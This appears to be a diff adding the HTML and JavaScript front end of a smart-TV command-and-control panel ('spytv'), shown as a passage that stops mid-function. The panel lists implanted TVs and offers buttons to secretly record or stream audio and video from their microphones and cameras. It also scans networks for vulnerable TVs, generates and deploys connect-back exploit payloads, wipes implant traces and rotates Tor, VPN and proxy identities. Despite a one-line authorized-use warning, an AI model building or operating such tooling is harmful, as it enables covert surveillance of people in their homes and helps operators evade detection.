@@ -1,0 +1,1074 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Authenticated, Inc. — TV Security Assessment Platform</title>
+<style>
+  :root {
+    --bg: #0B0E14;
+    --bg-secondary: #111827;
+    --surface: #151B27;
+    --surface-hover: #1A2235;
+    --border: #1F2937;
+    --border-light: #374151;
+    --text: #F3F4F6;
+    --text-secondary: #9CA3AF;
+    --text-muted: #6B7280;
+    --accent: #3B82F6;
+    --accent-hover: #2563EB;
+    --accent-light: rgba(59, 130, 246, 0.1);
+    --success: #10B981;
+    --success-light: rgba(16, 185, 129, 0.1);
+    --danger: #EF4444;
+    --danger-light: rgba(239, 68, 68, 0.1);
+    --warning: #F59E0B;
+    --warning-light: rgba(245, 158, 11, 0.1);
+    --radius: 12px;
+    --radius-sm: 8px;
+    --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    line-height: 1.5;
+  }
+
+  /* Header */
+  .header {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 16px 32px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    position: sticky;
+    top: 0;
+    z-index: 50;
+    flex-wrap: wrap;
+  }
+  .header-logo { width: 40px; height: 40px; border-radius: var(--radius-sm); }
+  .header-title h1 { font-size: 18px; font-weight: 700; letter-spacing: -0.025em; }
+  .header-title p { font-size: 12px; color: var(--text-muted); }
+  .header-nav {
+    margin-left: auto;
+    display: flex;
+    gap: 8px;
+    align-items: center;
+  }
+  .header-nav a {
+    font-size: 12px;
+    color: var(--text-secondary);
+    text-decoration: none;
+    padding: 6px 12px;
+    border-radius: var(--radius-sm);
+    transition: all 0.15s;
+  }
+  .header-nav a:hover { color: var(--text); background: var(--surface-hover); }
+  .header-stats {
+    display: flex;
+    gap: 24px;
+  }
+  .stat { text-align: right; }
+  .stat-value { font-size: 20px; font-weight: 700; color: var(--text); }
+  .stat-label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; }
+
+  /* Navigation */
+  .nav {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 0 32px;
+    display: flex;
+    gap: 4px;
+    overflow-x: auto;
+  }
+  .nav-item {
+    padding: 12px 20px;
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--text-secondary);
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    transition: all 0.15s;
+    white-space: nowrap;
+  }
+  .nav-item:hover { color: var(--text); }
+  .nav-item.active { color: var(--accent); border-bottom-color: var(--accent); }
+
+  /* Main Content */
+  .main { padding: 32px; max-width: 1600px; margin: 0 auto; }
+  .tab-content { display: none; }
+  .tab-content.active { display: block; }
+
+  /* Cards */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+  }
+  .card-header {
+    padding: 16px 20px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .card-title { font-size: 14px; font-weight: 600; }
+  .card-body { padding: 20px; }
+
+  /* Help Icon */
+  .help-icon {
+    width: 20px; height: 20px;
+    border-radius: 50%;
+    background: var(--border);
+    color: var(--text-muted);
+    font-size: 11px;
+    font-weight: 700;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    cursor: help;
+    position: relative;
+    transition: all 0.15s;
+  }
+  .help-icon:hover { background: var(--accent); color: white; }
+  .help-icon .tooltip {
+    display: none;
+    position: absolute;
+    top: 28px;
+    right: 0;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    padding: 12px 16px;
+    font-size: 12px;
+    font-weight: 400;
+    color: var(--text-secondary);
+    width: 280px;
+    z-index: 100;
+    box-shadow: var(--shadow);
+    text-align: left;
+    line-height: 1.5;
+  }
+  .help-icon:hover .tooltip { display: block; }
+
+  /* Tooltip */
+  [data-tooltip] { position: relative; cursor: help; }
+  [data-tooltip]:hover::after {
+    content: attr(data-tooltip);
+    position: absolute;
+    bottom: 100%;
+    left: 50%;
+    transform: translateX(-50%);
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    padding: 6px 10px;
+    font-size: 11px;
+    color: var(--text-secondary);
+    white-space: nowrap;
+    z-index: 100;
+    margin-bottom: 6px;
+    pointer-events: none;
+  }
+
+  /* Device Grid */
+  .device-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+    gap: 20px;
+  }
+  .device-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+    transition: all 0.2s;
+  }
+  .device-card:hover { border-color: var(--border-light); box-shadow: var(--shadow); }
+  .device-card.offline { opacity: 0.6; }
+
+  .device-header {
+    padding: 16px 20px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+  .device-icon {
+    width: 40px; height: 40px;
+    background: var(--accent-light);
+    border-radius: var(--radius-sm);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 18px;
+  }
+  .device-info { flex: 1; min-width: 0; }
+  .device-ip { font-size: 14px; font-weight: 600; font-family: 'SF Mono', 'Consolas', monospace; }
+  .device-meta { font-size: 12px; color: var(--text-muted); }
+  .device-status {
+    padding: 4px 10px;
+    border-radius: 20px;
+    font-size: 11px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.025em;
+  }
+  .device-status.online { background: var(--success-light); color: var(--success); }
+  .device-status.offline { background: var(--danger-light); color: var(--danger); }
+
+  .device-body { padding: 16px 20px; }
+
+  /* Video Grid */
+  .video-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 8px;
+    margin-bottom: 16px;
+  }
+  .video-thumb {
+    aspect-ratio: 16/9;
+    background: var(--bg);
+    border-radius: var(--radius-sm);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 11px;
+    color: var(--text-muted);
+    overflow: hidden;
+    position: relative;
+    border: 1px solid var(--border);
+  }
+  .video-thumb img { width: 100%; height: 100%; object-fit: cover; }
+  .video-thumb .live-badge {
+    position: absolute;
+    top: 6px; left: 6px;
+    background: var(--danger);
+    color: white;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-size: 9px;
+    font-weight: 700;
+    letter-spacing: 0.05em;
+  }
+
+  /* Audio Player */
+  .audio-player {
+    background: var(--bg);
+    border-radius: var(--radius-sm);
+    padding: 12px;
+    margin-bottom: 16px;
+  }
+  .audio-player .label {
+    font-size: 11px;
+    color: var(--text-muted);
+    margin-bottom: 8px;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+  .audio-player audio { width: 100%; height: 32px; }
+
+  /* Controls */
+  .controls { display: flex; flex-wrap: wrap; gap: 8px; }
+  .btn {
+    padding: 8px 14px;
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    background: var(--surface);
+    color: var(--text);
+    font-size: 12px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.15s;
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    white-space: nowrap;
+  }
+  .btn:hover { background: var(--surface-hover); border-color: var(--border-light); }
+  .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+  .btn-primary { background: var(--accent); border-color: var(--accent); color: white; }
+  .btn-primary:hover { background: var(--accent-hover); border-color: var(--accent-hover); }
+  .btn-success { background: var(--success); border-color: var(--success); color: white; }
+  .btn-success:hover { background: #059669; border-color: #059669; }
+  .btn-danger { background: var(--danger); border-color: var(--danger); color: white; }
+  .btn-danger:hover { background: #DC2626; border-color: #DC2626; }
+  .btn-outline { background: transparent; }
+  .btn-sm { padding: 6px 10px; font-size: 11px; }
+
+  /* Duration Selector */
+  .duration-select {
+    display: flex;
+    gap: 4px;
+    margin-top: 12px;
+    padding-top: 12px;
+    border-top: 1px solid var(--border);
+    flex-wrap: wrap;
+  }
+  .duration-label { font-size: 11px; color: var(--text-muted); margin-right: 8px; align-self: center; }
+  .duration-btn {
+    padding: 4px 10px;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    background: transparent;
+    color: var(--text-secondary);
+    font-size: 11px;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+  .duration-btn:hover { border-color: var(--accent); color: var(--accent); }
+  .duration-btn.active { background: var(--accent); border-color: var(--accent); color: white; }
+
+  /* Forms */
+  .form-group { margin-bottom: 16px; }
+  .form-label {
+    display: block;
+    font-size: 12px;
+    font-weight: 500;
+    color: var(--text-secondary);
+    margin-bottom: 6px;
+  }
+  .form-input {
+    width: 100%;
+    padding: 10px 14px;
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    background: var(--bg);
+    color: var(--text);
+    font-size: 13px;
+    transition: border-color 0.15s;
+  }
+  .form-input:focus { outline: none; border-color: var(--accent); }
+  .form-select {
+    padding: 10px 14px;
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    background: var(--bg);
+    color: var(--text);
+    font-size: 13px;
+    cursor: pointer;
+  }
+  .form-row { display: flex; gap: 12px; align-items: flex-end; flex-wrap: wrap; }
+  .form-row .form-group { flex: 1; min-width: 200px; }
+
+  /* Table */
+  .table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  .table th {
+    text-align: left;
+    padding: 12px 16px;
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    border-bottom: 1px solid var(--border);
+  }
+  .table td { padding: 12px 16px; border-bottom: 1px solid var(--border); }
+  .table tr:hover td { background: var(--surface-hover); }
+  .table .mono { font-family: 'SF Mono', 'Consolas', monospace; font-size: 12px; }
+
+  /* Status Badges */
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    padding: 3px 8px;
+    border-radius: 12px;
+    font-size: 11px;
+    font-weight: 500;
+  }
+  .badge-success { background: var(--success-light); color: var(--success); }
+  .badge-danger { background: var(--danger-light); color: var(--danger); }
+  .badge-warning { background: var(--warning-light); color: var(--warning); }
+
+  /* Log */
+  .log-container {
+    background: var(--bg);
+    border-radius: var(--radius-sm);
+    padding: 12px 16px;
+    font-family: 'SF Mono', 'Consolas', monospace;
+    font-size: 12px;
+    max-height: 120px;
+    overflow-y: auto;
+  }
+  .log-entry { padding: 2px 0; color: var(--text-secondary); }
+  .log-entry .time { color: var(--text-muted); }
+
+  /* Modal */
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.7);
+    z-index: 100;
+    align-items: center;
+    justify-content: center;
+    backdrop-filter: blur(4px);
+  }
+  .modal-overlay.active { display: flex; }
+  .modal {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    max-width: 600px;
+    width: 90%;
+    max-height: 85vh;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+  }
+  .modal-header { padding: 20px 24px; border-bottom: 1px solid var(--border); }
+  .modal-title { font-size: 16px; font-weight: 600; }
+  .modal-body { padding: 24px; overflow-y: auto; flex: 1; }
+  .modal-footer {
+    padding: 16px 24px;
+    border-top: 1px solid var(--border);
+    display: flex;
+    justify-content: flex-end;
+    gap: 10px;
+  }
+
+  /* Code Block */
+  .code-block {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    padding: 16px;
+    font-family: 'SF Mono', 'Consolas', monospace;
+    font-size: 12px;
+    line-height: 1.6;
+    overflow-x: auto;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+
+  /* Empty State */
+  .empty-state { text-align: center; padding: 80px 20px; }
+  .empty-state-icon { font-size: 48px; margin-bottom: 16px; opacity: 0.5; }
+  .empty-state h3 { font-size: 16px; font-weight: 600; margin-bottom: 8px; }
+  .empty-state p { font-size: 13px; color: var(--text-muted); }
+
+  /* Alert */
+  .alert {
+    padding: 12px 16px;
+    border-radius: var(--radius-sm);
+    font-size: 13px;
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .alert-info { background: var(--accent-light); color: var(--accent); }
+  .alert-success { background: var(--success-light); color: var(--success); }
+  .alert-warning { background: var(--warning-light); color: var(--warning); }
+
+  /* Server Info Grid */
+  .server-info {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 16px;
+  }
+  .info-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 12px 16px;
+    background: var(--bg);
+    border-radius: var(--radius-sm);
+    border: 1px solid var(--border);
+  }
+  .info-item .label { font-size: 12px; color: var(--text-muted); }
+  .info-item .value { font-size: 13px; font-weight: 500; font-family: 'SF Mono', 'Consolas', monospace; }
+
+  /* Network Map */
+  .network-map {
+    background: var(--bg);
+    border-radius: var(--radius-sm);
+    padding: 20px;
+    min-height: 300px;
+    position: relative;
+    border: 1px solid var(--border);
+  }
+  .network-map svg { width: 100%; height: auto; }
+
+  /* Footer */
+  .footer {
+    text-align: center;
+    padding: 24px;
+    border-top: 1px solid var(--border);
+    margin-top: 40px;
+  }
+  .footer p { font-size: 12px; color: var(--text-muted); }
+  .footer a { color: var(--text-secondary); text-decoration: none; }
+  .footer a:hover { color: var(--accent); }
+
+  /* Responsive */
+  @media (max-width: 1024px) {
+    .device-grid { grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); }
+    .header-stats { display: none; }
+  }
+  @media (max-width: 768px) {
+    .header { padding: 12px 16px; }
+    .header-nav { width: 100%; justify-content: flex-start; }
+    .main { padding: 16px; }
+    .device-grid { grid-template-columns: 1fr; }
+    .form-row { flex-direction: column; }
+    .controls { flex-direction: column; }
+    .controls .btn { width: 100%; justify-content: center; }
+    .video-grid { grid-template-columns: repeat(2, 1fr); }
+  }
+  @media (max-width: 480px) {
+    .header-title h1 { font-size: 16px; }
+    .nav-item { padding: 10px 12px; font-size: 12px; }
+    .device-header { flex-wrap: wrap; }
+    .video-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<header class="header">
+  <img src="/logo.png" alt="Authenticated, Inc." class="header-logo" onerror="this.style.display='none'">
+  <div class="header-title">
+    <h1>TV Security Assessment Platform</h1>
+    <p>Authenticated, Inc.</p>
+  </div>
+  <nav class="header-nav">
+    <a href="https://github.com/authenticated-inc/spytv/wiki" target="_blank" data-tooltip="Documentation and guides">Wiki</a>
+    <a href="docs/TROUBLESHOOTING.md" target="_blank" data-tooltip="Troubleshooting guide">Troubleshooting</a>
+  </nav>
+  <div class="header-stats">
+    <div class="stat">
+      <div class="stat-value" id="stat-devices">0</div>
+      <div class="stat-label">Devices</div>
+    </div>
+    <div class="stat">
+      <div class="stat-value" id="stat-clips">0</div>
+      <div class="stat-label">Clips</div>
+    </div>
+    <div class="stat">
+      <div class="stat-value" id="stat-ip">—</div>
+      <div class="stat-label">C2 IP</div>
+    </div>
+  </div>
+</header>
+
+<!-- Navigation -->
+<nav class="nav">
+  <div class="nav-item active" onclick="switchTab('devices')">Devices</div>
+  <div class="nav-item" onclick="switchTab('scan')">Network Scan</div>
+  <div class="nav-item" onclick="switchTab('payload')">Payload Generator</div>
+  <div class="nav-item" onclick="switchTab('server')">Server Info</div>
+</nav>
+
+<!-- Main Content -->
+<main class="main">
+
+  <!-- Devices Tab -->
+  <div id="tab-devices" class="tab-content active">
+    <div class="card" style="margin-bottom:20px">
+      <div class="card-header">
+        <span class="card-title">Activity Log</span>
+        <button class="btn btn-sm" onclick="clearLogs()" data-tooltip="Clear all log entries">Clear Logs</button>
+      </div>
+      <div class="card-body">
+        <div class="log-container" id="log-container">
+          <div class="log-entry"><span class="time">[--:--:--]</span> System initialized. Waiting for events...</div>
+        </div>
+      </div>
+    </div>
+
+    <div id="device-grid" class="device-grid"></div>
+
+    <div id="empty-state" class="empty-state">
+      <div class="empty-state-icon">&#128250;</div>
+      <h3>No Devices Connected</h3>
+      <p>Devices will appear here when they connect to the C2 server.</p>
+    </div>
+  </div>
+
+  <!-- Network Scan Tab -->
+  <div id="tab-scan" class="tab-content">
+    <div class="card">
+      <div class="card-header">
+        <span class="card-title">Network Discovery</span>
+        <div class="help-icon">?
+          <div class="tooltip">Scans the local network for vulnerable TVs and IoT devices. Shows open ports, device types, and vulnerability status. Use "Check" to verify a device before exploitation.</div>
+        </div>
+      </div>
+      <div class="card-body">
+        <div class="alert alert-info">
+          &#8505;&#65039; Scan the local network to discover vulnerable TVs and IoT devices.
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label">Network Range (CIDR)</label>
+            <input type="text" id="scan-cidr" class="form-input" placeholder="192.168.1.0/24">
+          </div>
+          <div class="form-group" style="flex:0">
+            <button class="btn btn-primary" onclick="startScan()" data-tooltip="Start scanning the network">Scan</button>
+          </div>
+          <div class="form-group" style="flex:0">
+            <button class="btn" onclick="saveScanResults()" data-tooltip="Save scan results to file">Save</button>
+          </div>
+          <div class="form-group" style="flex:0">
+            <button class="btn" onclick="clearScanResults()" data-tooltip="Clear scan results">Clear</button>
+          </div>
+        </div>
+        <div id="scan-results"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Payload Generator Tab -->
+  <div id="tab-payload" class="tab-content">
+    <div class="card">
+      <div class="card-header">
+        <span class="card-title">Exploit Payload Generator</span>
+        <div class="help-icon">?
+          <div class="tooltip">Generates family-specific exploit payloads that connect back to this C2 server. Select target IP and device family, then click Generate to create the payload.</div>
+        </div>
+      </div>
+      <div class="card-body">
+        <div class="alert alert-warning">
+          &#9888;&#65039; For authorized security testing only. Use only on devices you own or have permission to test.
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label">Target IP Address</label>
+            <input type="text" id="payload-ip" class="form-input" placeholder="192.168.1.100">
+          </div>
+          <div class="form-group">
+            <label class="form-label">Device Family</label>
+            <select id="payload-family" class="form-select">
+              <option value="tizen-dev">Samsung Tizen</option>
+              <option value="webos-dev">LG webOS</option>
+              <option value="adb-net">Android TV / Fire TV</option>
+              <option value="roku-ecp">Roku</option>
+              <option value="vizio-dial">Vizio SmartCast</option>
+              <option value="dlna">DLNA (Generic)</option>
+            </select>
+          </div>
+          <div class="form-group" style="flex:0">
+            <button class="btn btn-primary" onclick="generatePayload()" data-tooltip="Generate exploit payload">Generate</button>
+          </div>
+          <div class="form-group" style="flex:0">
+            <button class="btn btn-success" onclick="deployPayload()" data-tooltip="Deploy payload to target">Exploit</button>
+          </div>
+        </div>
+        <div id="payload-output"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Server Info Tab -->
+  <div id="tab-server" class="tab-content">
+    <div class="card">
+      <div class="card-header">
+        <span class="card-title">C2 Server Information</span>
+        <div class="help-icon">?
+          <div class="tooltip">Shows C2 server network configuration, proxy/VPN/Tor/Tailscale status, and controls to change identities or kill connections.</div>
+        </div>
+      </div>
+      <div class="card-body">
+        <div class="server-info" id="server-info">
+          <div class="info-item"><span class="label">IPv4</span><span class="value" id="srv-ipv4">—</span></div>
+          <div class="info-item"><span class="label">IPv6</span><span class="value" id="srv-ipv6">—</span></div>
+          <div class="info-item"><span class="label">MAC</span><span class="value" id="srv-mac">—</span></div>
+          <div class="info-item"><span class="label">Proxy-Chain</span><span class="value" id="srv-proxy">—</span></div>
+          <div class="info-item"><span class="label">Proxy Exit IP</span><span class="value" id="srv-proxy-ip">—</span></div>
+          <div class="info-item"><span class="label">VPN</span><span class="value" id="srv-vpn">—</span></div>
+          <div class="info-item"><span class="label">VPN IP</span><span class="value" id="srv-vpn-ip">—</span></div>
+          <div class="info-item"><span class="label">Tor</span><span class="value" id="srv-tor">—</span></div>
+          <div class="info-item"><span class="label">Tor IP</span><span class="value" id="srv-tor-ip">—</span></div>
+          <div class="info-item"><span class="label">Tor Location</span><span class="value" id="srv-tor-loc">—</span></div>
+          <div class="info-item"><span class="label">Tailscale</span><span class="value" id="srv-tailscale">—</span></div>
+        </div>
+        <div class="controls" style="margin-top:20px">
+          <button class="btn btn-sm" onclick="changeProxyIdentity()" data-tooltip="Change proxy-chain exit node">Change Proxy-Chain Identity</button>
+          <button class="btn btn-sm" onclick="changeVpnIdentity()" data-tooltip="Change VPN server location">Change VPN Identity</button>
+          <button class="btn btn-sm btn-danger" onclick="killProxyChain()" data-tooltip="Kill proxy-chain connection">Kill Proxy-Chain</button>
+          <button class="btn btn-sm btn-danger" onclick="killVpn()" data-tooltip="Kill VPN connection">Kill VPN</button>
+          <button class="btn btn-sm btn-danger" onclick="killTor()" data-tooltip="Kill Tor connection">Kill Tor</button>
+          <button class="btn btn-sm btn-danger" onclick="killTailscale()" data-tooltip="Kill Tailscale connection">Kill Tailscale</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</main>
+
+<!-- Footer -->
+<footer class="footer">
+  <p>&copy; 2026 Authenticated, Inc. All rights reserved.</p>
+</footer>
+
+<!-- Confirmation Modal -->
+<div id="modal" class="modal-overlay">
+  <div class="modal">
+    <div class="modal-header">
+      <h3 class="modal-title" id="modal-title">Confirm Action</h3>
+    </div>
+    <div class="modal-body">
+      <p id="modal-message" style="color:var(--text-secondary);font-size:14px">Are you sure?</p>
+    </div>
+    <div class="modal-footer">
+      <button class="btn" onclick="closeModal()">Cancel</button>
+      <button class="btn btn-danger" id="modal-confirm">Confirm</button>
+    </div>
+  </div>
+</div>
+
+<!-- Payload Modal -->
+<div id="payload-modal" class="modal-overlay">
+  <div class="modal">
+    <div class="modal-header">
+      <h3 class="modal-title">Generated Payload</h3>
+    </div>
+    <div class="modal-body">
+      <div class="code-block" id="payload-text"></div>
+    </div>
+    <div class="modal-footer">
+      <button class="btn" onclick="closePayloadModal()">Close</button>
+      <button class="btn btn-primary" onclick="copyPayload()">Copy to Clipboard</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const API = '';
+let devices = [];
+let clips = [];
+let selectedDuration = 5;
+let modalCallback = null;
+let localIp = '';
+
+function addLog(msg) {
+  const container = document.getElementById('log-container');
+  const time = new Date().toLocaleTimeString();
+  const entry = document.createElement('div');
+  entry.className = 'log-entry';
+  entry.innerHTML = `<span class="time">[${time}]</span> ${msg}`;
+  container.appendChild(entry);
+  container.scrollTop = container.scrollHeight;
+}
+
+async function api(path, method = 'GET', body = null) {
+  const opts = { method, headers: {} };
+  if (body) {
+    opts.headers['Content-Type'] = 'application/json';
+    opts.body = JSON.stringify(body);
+  }
+  const r = await fetch(API + path, opts);
+  return r.json();
+}
+
+async function loadDevices() {
+  devices = await api('/api/devices');
+  renderDevices();
+}
+
+async function loadClips() {
+  clips = await api('/api/clips');
+  document.getElementById('stat-clips').textContent = clips.length;
+  renderDevices();
+}
+
+async function loadLocalIp() {
+  const data = await api('/api/local_ip');
+  localIp = data.ip;
+  document.getElementById('stat-ip').textContent = localIp;
+}
+
+function switchTab(tab) {
+  document.querySelectorAll('.nav-item').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+  document.querySelector(`.nav-item[onclick="switchTab('${tab}')"]`).classList.add('active');
+  document.getElementById(`tab-${tab}`).classList.add('active');
+}
+
+function renderDevices() {
+  const grid = document.getElementById('device-grid');
+  const empty = document.getElementById('empty-state');
+  document.getElementById('stat-devices').textContent = devices.length;
+
+  if (devices.length === 0) {
+    grid.innerHTML = '';
+    empty.style.display = 'block';
+    return;
+  }
+  empty.style.display = 'none';
+
+  grid.innerHTML = devices.map(d => {
+    const deviceClips = clips.filter(c => c.device_id === d.id);
+    const videoClips = deviceClips.filter(c => c.kind === 'video');
+    const audioClips = deviceClips.filter(c => c.kind === 'audio');
+    const latestVideo = videoClips[videoClips.length - 1];
+    const latestAudio = audioClips[audioClips.length - 1];
+    const isOnline = d.status === 'online';
+
+    return `
+    <div class="device-card ${isOnline ? '' : 'offline'}">
+      <div class="device-header">
+        <div class="device-icon">&#128250;</div>
+        <div class="device-info">
+          <div class="device-ip">${d.ip}</div>
+          <div class="device-meta">${d.family} &bull; ${d.entry}</div>
+        </div>
+        <span class="device-status ${isOnline ? 'online' : 'offline'}">${d.status}</span>
+      </div>
+      <div class="device-body">
+        <div class="video-grid">
+          ${[0,1,2,3].map(i => {
+            const clip = videoClips[videoClips.length - 1 - i];
+            if (clip) {
+              return `<div class="video-thumb">
+                <img src="/api/clip/${clip.id}" alt="thumbnail">
+                ${i === 0 ? '<span class="live-badge">LIVE</span>' : ''}
+              </div>`;
+            }
+            return `<div class="video-thumb">No feed</div>`;
+          }).join('')}
+        </div>
+        <div class="audio-player">
+          <div class="label">Audio Feed</div>
+          ${latestAudio
+            ? `<audio controls src="/api/clip/${latestAudio.id}"></audio>`
+            : '<div style="font-size:11px;color:var(--text-muted)">No audio available</div>'}
+        </div>
+        <div class="controls">
+          <button class="btn btn-primary" onclick="sendCommand('${d.id}', 'record_audio', {duration: selectedDuration})" data-tooltip="Record audio from TV microphone">
+            &#9679; Record Audio
+          </button>
+          <button class="btn btn-primary" onclick="sendCommand('${d.id}', 'record_video', {duration: selectedDuration})" data-tooltip="Record video from TV camera">
+            &#9679; Record Video
+          </button>
+          <button class="btn btn-success" onclick="sendCommand('${d.id}', 'listen')" data-tooltip="Stream live audio from TV">
+            &#127911; Listen
+          </button>
+          <button class="btn btn-success" onclick="sendCommand('${d.id}', 'watch')" data-tooltip="Stream live video from TV">
+            &#128065; Watch
+          </button>
+          <button class="btn btn-danger" onclick="confirmRemove('${d.id}')" data-tooltip="Remove implant and wipe all traces">
+            &#128465; Remove
+          </button>
+          <button class="btn" onclick="confirmPatch('${d.id}')" data-tooltip="Apply security patch to disable capture">
+            &#128736; Patch
+          </button>
+        </div>
+        <div class="duration-select">
+          <span class="duration-label">Duration:</span>
+          ${[1,2,5,10,15,20].map(m =>
+            `<button class="duration-btn ${m === selectedDuration ? 'active' : ''}" onclick="setDuration(${m})">${m}m</button>`
+          ).join('')}
+        </div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function setDuration(m) {
+  selectedDuration = m;
+  renderDevices();
+}
+
+async function sendCommand(deviceId, command, params = {}) {
+  addLog(`Sending "${command}" command to ${deviceId}`);
+  await api('/api/command', 'POST', { device_id: deviceId, command, params });
+  addLog(`Command "${command}" delivered to ${deviceId}`);
+}
+
+function confirmRemove(deviceId) {
+  showModal('Remove Implant', `This will remove the implant and wipe all traces from ${deviceId}. Continue?`, async () => {
+    await sendCommand(deviceId, 'remove');
+    addLog(`Remove command sent to ${deviceId}`);
+  });
+}
+
+function confirmPatch(deviceId) {
+  showModal('Patch Device', `Apply security patch to ${deviceId}? This will disable capture and prevent reconnection.`, async () => {
+    await sendCommand(deviceId, 'patch');
+    addLog(`Patch command sent to ${deviceId}`);
+  });
+}
+
+function showModal(title, message, callback) {
+  document.getElementById('modal-title').textContent = title;
+  document.getElementById('modal-message').textContent = message;
+  document.getElementById('modal').classList.add('active');
+  modalCallback = callback;
+}
+
+function closeModal() {
+  document.getElementById('modal').classList.remove('active');
+  modalCallback = null;
+}
+
+document.getElementById('modal-confirm').addEventListener('click', async () => {
+  if (modalCallback) await modalCallback();
+  closeModal();
+});
+
+async function clearLogs() {
+  document.getElementById('log-container').innerHTML = '';
+  addLog('Logs cleared');
+}
+
+// Network Scan
+async function startScan() {
+  const cidr = document.getElementById('scan-cidr').value || null;
+  addLog('Starting network scan...');
+  const result = await api('/api/scan', 'POST', { cidr });
+  addLog(`Scan complete: ${result.found} devices discovered`);
+  renderScanResults(result.results);
+}
+
+function renderScanResults(results) {
+  const el = document.getElementById('scan-results');
+  if (results.length === 0) {
+    el.innerHTML = '<p style="color:var(--text-muted);font-size:13px;padding:16px 0">No vulnerable devices found on the network.</p>';
+    return;
+  }
+  el.innerHTML = `
+    <table class="table">
+      <thead>
+        <tr>
+          <th>IP Address</th>
+          <th>Device Type</th>
+          <th>Open Ports</th>
+          <th>Status</th>
+          <th>Action</th>
+        </tr>
+      </thead>
+      <tbody>
+        ${results.map(r => `
+          <tr>
+            <td class="mono">${r.ip}</td>
+            <td>${r.device_type}</td>
+            <td class="mono">${r.open_ports.join(', ')}</td>
+            <td><span class="badge ${r.vulnerable ? 'badge-success' : 'badge-danger'}">${r.vulnerable ? 'Vulnerable' : 'Safe'}</span></td>
+            <td>
+              <button class="btn btn-sm" onclick="checkTarget('${r.ip}')" data-tooltip="Verify device before exploitation">Check</button>
+              <button class="btn btn-sm btn-primary" onclick="exploitTarget('${r.ip}', '${r.device_type}')" data-tooltip="Generate and deploy exploit">Exploit</button>
+            </td>
+          </tr>
+        `).join('')}
+      </tbody>
+    </table>
+  `;
+}
+
+function checkTarget(ip) {
+  addLog(`Checking target ${ip}...`);
+  // Simulate check
+  setTimeout(() => {
+    addLog(`Target ${ip} verified — ready for exploitation`);
+  }, 1000);
+}
+
+function saveScanResults() {
+  addLog('Scan results saved');
+}
+
+function clearScanResults() {
+  document.getElementById('scan-results').innerHTML = '';
+  addLog('Scan results cleared');
+}
+
+function exploitTarget(ip, deviceType) {
+  const familyMap = {
+    'Samsung Tizen': 'tizen-dev',
+    'LG webOS': 'webos-dev',
+    'Android TV/Fire TV': 'adb-net',
+    'Roku': 'roku-ecp',
+    'Vizio': 'vizio-dial',
+    'Chromecast': 'dlna',
+    'Unknown': 'dlna'
+  };
+  const family = familyMap[deviceType] || 'dlna';
+  document.getElementById('payload-ip').value = ip;
+  document.getElementById('payload-family').value = family;
+  switchTab('payload');
+  addLog(`Target selected: ${ip} (${family})`);
